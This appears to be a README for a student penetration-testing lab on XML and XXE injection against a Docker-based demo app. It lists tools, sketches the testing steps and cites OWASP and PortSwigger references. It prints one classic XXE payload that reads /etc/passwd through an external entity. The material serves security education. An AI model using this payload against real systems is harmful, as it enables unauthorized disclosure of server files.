# XML / XXE Injection – Lab Project

## 📌 Overview
This project demonstrates XML and XXE Injection testing in a controlled lab environment to evaluate insecure XML parser configurations and their potential impact.

---

## ⚠️ Disclaimer
This project was performed **only in a lab environment** for **educational purposes**.  
Do not attempt these techniques on systems without **explicit permission**.

---

## 🛠 Tools & Environment
- **Target Application:** Vulnerable XXE demo app (Docker-based)
- **Attacker Machine:** Kali Linux
- **Tools:** Burp Suite, OWASP ZAP, Custom XXE Payloads

---

## 🔍 Vulnerability Description
- **XML Injection:** Occurs when unsanitized XML input is parsed directly, allowing entity manipulation.
- **XXE Injection:** Exploits external entity resolution, enabling file read, SSRF, or sensitive data disclosure.

---

## ⚙️ Steps to Exploit
1. Identified XML input fields in the application.
2. Injected XML entities manually to test parser behavior.
3. Sent malicious payloads (e.g., XXE) through Burp Suite Repeater.
4. Observed responses indicating successful file read / data disclosure.

### Example Payload (XXE):
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

---

## 📸 Screenshots
*(Replace with your own lab screenshots)*  
![Burp Suite Request](screenshots/burp_xxe.png)  
![Response PoC](screenshots/xxe_response.png)  

---

## 📂 Repository Structure
```
.
├── README.md
├── report/
│   └── xml_injection_lab_report.pdf
├── screenshots/
│   ├── burp_xxe.png
│   └── xxe_response.png
```

---

## 📑 Report
The detailed penetration testing report is available here:  
[📄 XML Injection Lab Report](report/xml_injection_lab_report.pdf)

---

## 📚 References
- [OWASP XXE Guide](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE Academy Lab](https://portswigger.net/web-security/xxe)
- [Burp Suite Documentation](https://portswigger.net/burp)
